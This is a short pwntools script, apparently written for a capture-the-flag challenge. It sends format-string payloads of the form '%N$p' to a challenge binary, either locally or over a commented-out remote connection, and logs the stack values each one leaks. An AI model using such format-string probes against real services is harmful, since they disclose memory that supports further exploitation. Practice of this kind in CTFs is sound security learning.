from pwn import *
exe = context.binary = ELF('./chall')
for i in range(100):
    r = process()
    # r = remote('9fba656c5e5ee568238f4a10561a3d27.chall.dvc.tf', 443, ssl=True)
    # sleep(5)
    r.sendline(f"%{i}$p")
    r.sendline('1')
    r.recvuntil(b'Your identity is : \n')
    msg = r.recvline()
    log.info(f"{i} => {msg}")
    r.close()
